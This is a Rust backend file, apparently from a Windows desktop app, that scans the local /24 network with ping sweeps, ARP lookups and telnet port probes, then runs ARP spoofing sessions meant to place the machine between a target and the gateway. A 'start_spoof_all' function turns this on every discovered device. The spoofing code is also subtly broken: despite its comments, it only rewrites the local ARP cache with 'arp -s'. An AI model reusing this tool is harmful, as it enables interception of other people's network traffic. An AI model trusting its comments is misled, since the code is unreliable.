use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use std::net::{IpAddr, Ipv4Addr};
use std::process::Command;

use serde::{Deserialize, Serialize};
use tauri::State;
use uuid::Uuid;
use ipnetwork::Ipv4Network;
use if_addrs::get_if_addrs;
use network_interface::{NetworkInterface, NetworkInterfaceConfig};

// Windows API imports
use windows::Win32::NetworkManagement::IpHelper::{
    GetIpNetTable, MIB_IPNETTABLE, MIB_IPNET_TYPE_DYNAMIC,
    MIB_IPNET_TYPE_STATIC, MIB_IPNET_TYPE_OTHER
};
use windows::Win32::Foundation::{ERROR_INSUFFICIENT_BUFFER, NO_ERROR};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkDevice {
    pub ip: String,
    pub mac: String,
    pub hostname: String,
    pub vendor: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CustomNetworkInterface {
    pub name: String,
    pub description: String,
    pub mac: String,
    pub ips: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpoofingSession {
    pub id: String,
    pub target_ip: String,
    pub gateway_ip: String,
    pub interface: String,
    pub is_active: bool,
    pub packets_sent: u32,
}

#[derive(Default)]
pub struct SpoofingSessions(Arc<Mutex<HashMap<String, SpoofingSessionInfo>>>);

#[derive(Debug)]
pub struct SpoofingSessionInfo {
    pub session: SpoofingSession,
    pub stop_flag: Arc<Mutex<bool>>,
}

impl SpoofingSessions {
    pub fn inner(&self) -> Arc<Mutex<HashMap<String, SpoofingSessionInfo>>> {
        self.0.clone()
    }
}

pub fn get_interfaces() -> Result<Vec<CustomNetworkInterface>, String> {
    let mut interfaces = Vec::new();
    
    // Get all network interfaces using if-addrs
    let if_addrs = get_if_addrs().map_err(|e| format!("Failed to get interfaces: {}", e))?;
    
    // Group interfaces by name
    let mut interface_map: HashMap<String, Vec<IpAddr>> = HashMap::new();
    
    for iface in if_addrs {
        if iface.is_loopback() {
            continue;
        }
        
        // Only include IPv4 addresses that are not link-local
        if let IpAddr::V4(ipv4) = iface.ip() {
            if !ipv4.is_link_local() && !ipv4.is_loopback() {
                interface_map.entry(iface.name.clone())
                    .or_insert_with(Vec::new)
                    .push(iface.ip());
            }
        }
    }
    
    // Get additional interface information using network-interface crate
    let network_interfaces = NetworkInterface::show().map_err(|e| format!("Failed to get network interfaces: {}", e))?;
    
    for (name, ips) in interface_map {
        if ips.is_empty() {
            continue;
        }
        
        // Find matching network interface for MAC address
        let mac_addr = network_interfaces.iter()
            .find(|ni| ni.name == name)
            .and_then(|ni| ni.mac_addr.as_ref())
            .map(|mac| mac.to_string())
            .unwrap_or_else(|| "00:00:00:00:00:00".to_string());
        
        let ip_strings: Vec<String> = ips.iter().map(|ip| ip.to_string()).collect();
        
        let custom_interface = CustomNetworkInterface {
            name: name.clone(),
            description: format!("{} - {}", name, ip_strings.join(", ")),
            mac: mac_addr,
            ips: ip_strings,
        };
        
        interfaces.push(custom_interface);
    }
    
    if interfaces.is_empty() {
        return Err("No suitable network interfaces found".to_string());
    }
    
    Ok(interfaces)
}

pub fn scan_network(interface_name: String) -> Result<Vec<NetworkDevice>, String> {
    // Get the interface information
    let interfaces = get_interfaces()?;
    let interface = interfaces.iter()
        .find(|iface| iface.name == interface_name)
        .ok_or_else(|| format!("Interface '{}' not found", interface_name))?;
    
    // Get the first IPv4 address from the interface
    let local_ip_str = interface.ips.first()
        .ok_or_else(|| "No IPv4 address found on interface".to_string())?;
    
    let local_ip: Ipv4Addr = local_ip_str.parse()
        .map_err(|e| format!("Invalid IP address: {}", e))?;
    
    // Create network range (assuming /24 subnet)
    let network = Ipv4Network::new(local_ip, 24)
        .map_err(|e| format!("Failed to create network: {}", e))?;
    
    // Perform Windows API-based ARP scan
    perform_windows_arp_scan(network, &interface.mac)
}

fn perform_windows_arp_scan(network: Ipv4Network, local_mac: &str) -> Result<Vec<NetworkDevice>, String> {
    let mut devices = HashMap::new();
    let local_ip = network.ip();
    
    println!("Starting comprehensive network scan for {}", network);
    
    // Method 1: Read existing ARP table first
    if let Ok(arp_entries) = get_windows_arp_table() {
        for entry in arp_entries {
            let ip: Ipv4Addr = entry.ip.parse().unwrap_or_else(|_| Ipv4Addr::new(0, 0, 0, 0));
            if network.contains(ip) && ip != local_ip {
                devices.insert(entry.ip.clone(), (entry.mac, "ARP Table".to_string()));
            }
        }
    }
    
    // Method 2: Aggressive ping sweep with multiple techniques
    println!("Performing ping sweep...");
    perform_aggressive_ping_sweep(network)?;
    
    // Method 3: ARP requests using Windows commands
    println!("Sending ARP requests...");
    perform_arp_requests(network)?;
    
    // Method 4: Port scanning on common ports to trigger responses
    println!("Performing port scan on common ports...");
    perform_port_scan(network)?;
    
    // Wait for network responses
    thread::sleep(Duration::from_secs(3));
    
    // Read ARP table again after aggressive scanning
    if let Ok(arp_entries) = get_windows_arp_table() {
        for entry in arp_entries {
            let ip: Ipv4Addr = entry.ip.parse().unwrap_or_else(|_| Ipv4Addr::new(0, 0, 0, 0));
            if network.contains(ip) && ip != local_ip {
                devices.insert(entry.ip.clone(), (entry.mac, "ARP Scan".to_string()));
            }
        }
    }
    
    // Method 5: Use netsh to discover neighbors
    println!("Checking neighbor discovery...");
    if let Ok(neighbors) = get_neighbor_discovery(network) {
        for (ip, mac) in neighbors {
            devices.insert(ip, (mac, "Neighbor Discovery".to_string()));
        }
    }
    
    // Convert to final device list
    let mut device_list = Vec::new();
    
    for (ip, (mac, discovery_method)) in devices {
        let hostname = resolve_hostname(&ip).unwrap_or_else(|| "Unknown".to_string());
        let vendor = get_vendor_from_mac(&mac).unwrap_or_else(|| discovery_method);
        
        device_list.push(NetworkDevice {
            ip,
            mac,
            hostname,
            vendor,
        });
    }
    
    // Add our own interface
    device_list.push(NetworkDevice {
        ip: local_ip.to_string(),
        mac: local_mac.to_string(),
        hostname: "Local Machine".to_string(),
        vendor: "Local".to_string(),
    });
    
    // Sort by IP address
    device_list.sort_by(|a, b| {
        let a_ip: Result<Ipv4Addr, _> = a.ip.parse();
        let b_ip: Result<Ipv4Addr, _> = b.ip.parse();
        match (a_ip, b_ip) {
            (Ok(a_addr), Ok(b_addr)) => a_addr.cmp(&b_addr),
            _ => a.ip.cmp(&b.ip),
        }
    });
    
    println!("Scan complete. Found {} devices", device_list.len());
    Ok(device_list)
}

#[derive(Debug)]
struct ArpEntry {
    ip: String,
    mac: String,
}

fn perform_aggressive_ping_sweep(network: Ipv4Network) -> Result<(), String> {
    let mut handles = Vec::new();
    
    // Send multiple types of pings to all IPs in the network
    for target_ip in network.iter().take(254) {
        let ip_str = target_ip.to_string();
        
        let handle = thread::spawn(move || {
            // Method 1: Standard ping
            let _ = Command::new("ping")
                .arg("-n")
                .arg("1")
                .arg("-w")
                .arg("50")
                .arg(&ip_str)
                .output();
            
            // Method 2: Ping with different packet size
            let _ = Command::new("ping")
                .arg("-n")
                .arg("1")
                .arg("-w")
                .arg("50")
                .arg("-l")
                .arg("32")
                .arg(&ip_str)
                .output();
        });
        
        handles.push(handle);
        
        // Limit concurrent operations
        if handles.len() >= 30 {
            for handle in handles.drain(..) {
                let _ = handle.join();
            }
        }
    }
    
    // Wait for remaining operations
    for handle in handles {
        let _ = handle.join();
    }
    
    Ok(())
}

fn perform_arp_requests(network: Ipv4Network) -> Result<(), String> {
    let mut handles = Vec::new();
    
    // Send ARP requests using Windows arp command
    for target_ip in network.iter().take(254) {
        let ip_str = target_ip.to_string();
        
        let handle = thread::spawn(move || {
            // Try to resolve MAC address using arp command
            let _ = Command::new("arp")
                .arg("-a")
                .arg(&ip_str)
                .output();
        });
        
        handles.push(handle);
        
        if handles.len() >= 20 {
            for handle in handles.drain(..) {
                let _ = handle.join();
            }
        }
    }
    
    for handle in handles {
        let _ = handle.join();
    }
    
    Ok(())
}

fn perform_port_scan(network: Ipv4Network) -> Result<(), String> {
    let common_ports = vec![80, 443, 22, 21, 23, 25, 53, 110, 995, 993, 143, 587];
    let mut handles = Vec::new();
    
    // Scan common ports to trigger network responses
    for target_ip in network.iter().take(254) {
        let ip_str = target_ip.to_string();
        
        for &port in &common_ports {
            let ip_clone = ip_str.clone();
            let handle = thread::spawn(move || {
                // Use telnet or netstat to probe ports
                let _ = Command::new("telnet")
                    .arg(&ip_clone)
                    .arg(&port.to_string())
                    .output();
            });
            
            handles.push(handle);
            
            // Limit concurrent connections
            if handles.len() >= 50 {
                for handle in handles.drain(..) {
                    let _ = handle.join();
                }
            }
        }
    }
    
    for handle in handles {
        let _ = handle.join();
    }
    
    Ok(())
}

fn get_neighbor_discovery(network: Ipv4Network) -> Result<Vec<(String, String)>, String> {
    let mut neighbors = Vec::new();
    
    // Use netsh to get neighbor cache
    let output = Command::new("netsh")
        .arg("interface")
        .arg("ipv4")
        .arg("show")
        .arg("neighbors")
        .output()
        .map_err(|e| format!("Failed to run netsh: {}", e))?;
    
    if output.status.success() {
        let output_str = String::from_utf8_lossy(&output.stdout);
        
        for line in output_str.lines() {
            if line.contains("Reachable") || line.contains("Stale") {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 {
                    let ip = parts[0];
                    let mac = parts[1];
                    
                    if let Ok(ip_addr) = ip.parse::<Ipv4Addr>() {
                        if network.contains(ip_addr) {
                            neighbors.push((ip.to_string(), mac.to_string()));
                        }
                    }
                }
            }
        }
    }
    
    Ok(neighbors)
}

fn get_windows_arp_table() -> Result<Vec<ArpEntry>, String> {
    let mut entries = Vec::new();
    
    unsafe {
        let mut buffer_size = 0u32;
        
        // First call to get the required buffer size
        let result = GetIpNetTable(None, &mut buffer_size, false);
        
        if result != ERROR_INSUFFICIENT_BUFFER.0 {
            return Err("Failed to get ARP table size".to_string());
        }
        
        // Allocate buffer
        let mut buffer = vec![0u8; buffer_size as usize];
        let table_ptr = buffer.as_mut_ptr() as *mut MIB_IPNETTABLE;
        
        // Second call to get the actual data
        let result = GetIpNetTable(Some(table_ptr), &mut buffer_size, false);
        
        if result != NO_ERROR.0 {
            return Err(format!("Failed to get ARP table: {}", result));
        }
        
        let table = &*table_ptr;
        let num_entries = table.dwNumEntries as usize;
        
        // Safety check: ensure we don't exceed the actual table size
        let max_entries = std::cmp::min(num_entries, table.table.len());
        
        // Process each ARP entry
        for i in 0..max_entries {
            let entry = &table.table[i];
            
            // Convert IP address
            let ip_addr = Ipv4Addr::from(u32::from_be(entry.dwAddr));
            
            // Convert MAC address
            let mac_bytes = &entry.bPhysAddr[..entry.dwPhysAddrLen as usize];
            let mac_str = if mac_bytes.len() == 6 {
                format!("{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                    mac_bytes[0], mac_bytes[1], mac_bytes[2],
                    mac_bytes[3], mac_bytes[4], mac_bytes[5])
            } else {
                "00:00:00:00:00:00".to_string()
            };
            
            // Only include dynamic and static entries (skip invalid ones)
            if entry.Anonymous.Type == MIB_IPNET_TYPE_DYNAMIC ||
               entry.Anonymous.Type == MIB_IPNET_TYPE_STATIC ||
               entry.Anonymous.Type == MIB_IPNET_TYPE_OTHER {
                entries.push(ArpEntry {
                    ip: ip_addr.to_string(),
                    mac: mac_str,
                });
            }
        }
    }
    
    Ok(entries)
}

fn resolve_hostname(ip: &str) -> Option<String> {
    let output = Command::new("nslookup")
        .arg(ip)
        .output()
        .ok()?;
    
    let output_str = String::from_utf8(output.stdout).ok()?;
    
    for line in output_str.lines() {
        if line.contains("name =") {
            if let Some(name) = line.split("name =").nth(1) {
                return Some(name.trim().trim_end_matches('.').to_string());
            }
        }
    }
    
    None
}

fn get_vendor_from_mac(_mac: &str) -> Option<String> {
    // This would typically involve looking up the MAC address in an OUI database
    // For now, return a placeholder
    Some("Unknown".to_string())
}

pub fn start_spoofing(
    target_ip: String,
    gateway_ip: String,
    interface_name: String,
    state: State<SpoofingSessions>,
) -> Result<String, String> {
    let session_id = Uuid::new_v4().to_string();
    
    // Validate IP addresses
    let target_addr: Ipv4Addr = target_ip.parse()
        .map_err(|e| format!("Invalid target IP: {}", e))?;
    let gateway_addr: Ipv4Addr = gateway_ip.parse()
        .map_err(|e| format!("Invalid gateway IP: {}", e))?;
    
    // Create session
    let session = SpoofingSession {
        id: session_id.clone(),
        target_ip: target_ip.clone(),
        gateway_ip: gateway_ip.clone(),
        interface: interface_name.clone(),
        is_active: true,
        packets_sent: 0,
    };
    
    let stop_flag = Arc::new(Mutex::new(false));
    let stop_flag_clone = stop_flag.clone();
    
    // Start spoofing thread
    let session_id_clone = session_id.clone();
    let sessions_clone = state.0.clone();
    
    thread::spawn(move || {
        perform_windows_arp_spoofing(
            target_addr,
            gateway_addr,
            interface_name,
            stop_flag_clone,
            session_id_clone,
            sessions_clone,
        );
    });
    
    // Store session data
    let session_info = SpoofingSessionInfo {
        session,
        stop_flag,
    };
    
    let mut sessions = state.0.lock().map_err(|e| e.to_string())?;
    sessions.insert(session_id.clone(), session_info);
    
    Ok(session_id)
}

fn perform_windows_arp_spoofing(
    target_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    interface_name: String,
    stop_flag: Arc<Mutex<bool>>,
    session_id: String,
    sessions: Arc<Mutex<HashMap<String, SpoofingSessionInfo>>>,
) {
    let mut packet_count = 0u32;
    
    // Get local MAC address for the interface
    let local_mac = match get_interface_mac(&interface_name) {
        Ok(mac) => mac,
        Err(e) => {
            eprintln!("Failed to get interface MAC: {}", e);
            return;
        }
    };
    
    loop {
        // Check stop flag
        if let Ok(should_stop) = stop_flag.lock() {
            if *should_stop {
                break;
            }
        }
        
        // Perform ARP spoofing using Windows commands
        // 1. Tell target that we are the gateway
        if let Err(e) = send_windows_arp_spoof(&local_mac, &gateway_ip.to_string(), &target_ip.to_string()) {
            eprintln!("Failed to send ARP spoof to target: {}", e);
        } else {
            packet_count += 1;
        }
        
        // 2. Tell gateway that we are the target  
        if let Err(e) = send_windows_arp_spoof(&local_mac, &target_ip.to_string(), &gateway_ip.to_string()) {
            eprintln!("Failed to send ARP spoof to gateway: {}", e);
        } else {
            packet_count += 1;
        }
        
        // Update packet count in session
        if let Ok(mut sessions_guard) = sessions.lock() {
            if let Some(session_info) = sessions_guard.get_mut(&session_id) {
                session_info.session.packets_sent = packet_count;
            }
        }
        
        // Wait before next iteration
        thread::sleep(Duration::from_millis(500));
    }
    
    // Mark session as inactive when stopping
    if let Ok(mut sessions_guard) = sessions.lock() {
        if let Some(session_info) = sessions_guard.get_mut(&session_id) {
            session_info.session.is_active = false;
        }
    }
}

fn get_interface_mac(interface_name: &str) -> Result<String, String> {
    let interfaces = get_interfaces()?;
    let interface = interfaces.iter()
        .find(|iface| iface.name == interface_name)
        .ok_or_else(|| format!("Interface '{}' not found", interface_name))?;
    
    Ok(interface.mac.clone())
}

fn send_windows_arp_spoof(local_mac: &str, _spoof_ip: &str, target_ip: &str) -> Result<(), String> {
    // Use netsh command to add static ARP entry (this is a simplified approach)
    // In a real implementation, you might want to use raw sockets or WinPcap
    
    // First, delete any existing ARP entry
    let _ = Command::new("arp")
        .arg("-d")
        .arg(target_ip)
        .output();
    
    // Add our spoofed ARP entry
    let output = Command::new("arp")
        .arg("-s")
        .arg(target_ip)
        .arg(local_mac)
        .output()
        .map_err(|e| format!("Failed to execute arp command: {}", e))?;
    
    if !output.status.success() {
        let error_msg = String::from_utf8_lossy(&output.stderr);
        return Err(format!("ARP command failed: {}", error_msg));
    }
    
    Ok(())
}

pub fn stop_spoofing(
    session_id: String,
    state: State<SpoofingSessions>,
) -> Result<bool, String> {
    let mut sessions = state.0.lock().map_err(|e| e.to_string())?;
    
    if let Some(session_info) = sessions.get_mut(&session_id) {
        // Set stop flag
        if let Ok(mut stop_flag) = session_info.stop_flag.lock() {
            *stop_flag = true;
        }
        
        // Mark session as inactive
        session_info.session.is_active = false;
        
        Ok(true)
    } else {
        Err("Session not found".into())
    }
}

pub fn get_active_sessions(
    state: State<SpoofingSessions>,
) -> Result<Vec<SpoofingSession>, String> {
    let sessions = state.0.lock().map_err(|e| e.to_string())?;
    let mut active_sessions = Vec::new();
    
    for session_info in sessions.values() {
        active_sessions.push(session_info.session.clone());
    }
    
    Ok(active_sessions)
}

pub fn start_spoof_all(
    devices: Vec<NetworkDevice>,
    gateway_ip: String,
    interface_name: String,
    state: State<SpoofingSessions>,
) -> Result<Vec<String>, String> {
    let mut session_ids = Vec::new();
    
    for device in devices {
        if device.ip == gateway_ip {
            continue; // Skip the gateway itself
        }
        
        let device_ip = device.ip.clone();
        match start_spoofing(
            device.ip,
            gateway_ip.clone(),
            interface_name.clone(),
            state.clone(),
        ) {
            Ok(session_id) => session_ids.push(session_id),
            Err(e) => eprintln!("Failed to start spoofing for {}: {}", device_ip, e),
        }
    }
    
    Ok(session_ids)
}
